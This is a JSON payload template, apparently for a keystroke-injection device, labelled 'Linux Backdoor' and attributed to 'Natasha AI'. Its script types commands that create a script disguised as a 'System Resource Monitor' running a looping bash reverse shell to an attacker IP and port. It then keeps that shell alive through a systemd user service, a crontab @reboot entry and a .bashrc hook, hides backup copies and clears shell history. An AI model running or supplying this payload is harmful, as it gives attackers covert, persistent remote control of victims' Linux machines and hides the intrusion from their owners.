{
  "metadata": {
    "name": "Linux Backdoor",
    "description": "Creates persistent backdoor access on Linux systems",
    "version": "1.0",
    "author": "Natasha AI"
  },
  "templates": [
    {
      "name": "Systemd User Service Backdoor",
      "description": "Creates a systemd user service that establishes a reverse shell connection",
      "attack_type": "backdoor",
      "script": [
        "REM Linux Systemd User Service Backdoor",
        "REM Generated by Natasha AI",
        "DELAY 1000",
        "ALT F2",
        "DELAY 500",
        "STRING terminal",
        "DELAY 500",
        "ENTER",
        "DELAY 1000",
        "STRING mkdir -p ~/.config/systemd/user",
        "ENTER",
        "DELAY 300",
        "STRING mkdir -p ~/.local/bin",
        "ENTER",
        "DELAY 300",
        "STRING ATTACKER_IP=&quot;ATTACKER_IP&quot;  # Replace with actual IP in parameters",
        "ENTER",
        "STRING ATTACKER_PORT=&quot;ATTACKER_PORT&quot;  # Replace with actual port in parameters",
        "ENTER",
        "STRING cat > ~/.local/bin/system_monitor.sh << 'EOF'",
        "ENTER",
        "STRING #!/bin/bash",
        "ENTER",
        "STRING # Linux System Monitor Service",
        "ENTER",
        "STRING while true; do",
        "ENTER",
        "STRING   sleep 30",
        "ENTER",
        "STRING   bash -i >& /dev/tcp/$ATTACKER_IP/$ATTACKER_PORT 0>&1 2>/dev/null",
        "ENTER",
        "STRING   sleep 300  # Wait 5 minutes before trying again",
        "ENTER",
        "STRING done",
        "ENTER",
        "STRING EOF",
        "ENTER",
        "DELAY 300",
        "STRING chmod +x ~/.local/bin/system_monitor.sh",
        "ENTER",
        "DELAY 300",
        "STRING cat > ~/.config/systemd/user/system-monitor.service << EOF",
        "ENTER",
        "STRING [Unit]",
        "ENTER",
        "STRING Description=System Resource Monitor",
        "ENTER",
        "STRING After=network.target",
        "ENTER",
        "STRING",
        "ENTER",
        "STRING [Service]",
        "ENTER",
        "STRING Type=simple",
        "ENTER",
        "STRING ExecStart=/bin/bash $HOME/.local/bin/system_monitor.sh",
        "ENTER",
        "STRING Restart=always",
        "ENTER",
        "STRING RestartSec=10",
        "ENTER",
        "STRING",
        "ENTER",
        "STRING [Install]",
        "ENTER",
        "STRING WantedBy=default.target",
        "ENTER",
        "STRING EOF",
        "ENTER",
        "DELAY 300",
        "STRING systemctl --user enable system-monitor.service",
        "ENTER",
        "DELAY 300",
        "STRING systemctl --user start system-monitor.service",
        "ENTER",
        "DELAY 300",
        "STRING # Add to crontab for additional persistence",
        "ENTER",
        "STRING (crontab -l 2>/dev/null; echo &quot;@reboot ~/.local/bin/system_monitor.sh&quot;) | crontab -",
        "ENTER",
        "DELAY 300",
        "STRING # Create a hidden backup copy",
        "ENTER",
        "STRING mkdir -p ~/.cache/.backup",
        "ENTER",
        "STRING cp ~/.local/bin/system_monitor.sh ~/.cache/.backup/",
        "ENTER",
        "STRING cp ~/.config/systemd/user/system-monitor.service ~/.cache/.backup/",
        "ENTER",
        "DELAY 300",
        "STRING # Add additional persistence through .bashrc",
        "ENTER",
        "STRING echo &quot;# System monitoring&quot; >> ~/.bashrc",
        "ENTER",
        "STRING echo &quot;if ! pgrep -f system_monitor.sh > /dev/null; then nohup ~/.local/bin/system_monitor.sh > /dev/null 2>&1 & fi&quot; >> ~/.bashrc",
        "ENTER",
        "DELAY 300",
        "STRING # Clean up history",
        "ENTER",
        "STRING history -c",
        "ENTER",
        "DELAY 300",
        "STRING exit",
        "ENTER"
      ],
      "parameters": {
        "ATTACKER_IP": "192.168.1.100",
        "ATTACKER_PORT": "4444"
      }
    }
  ]
}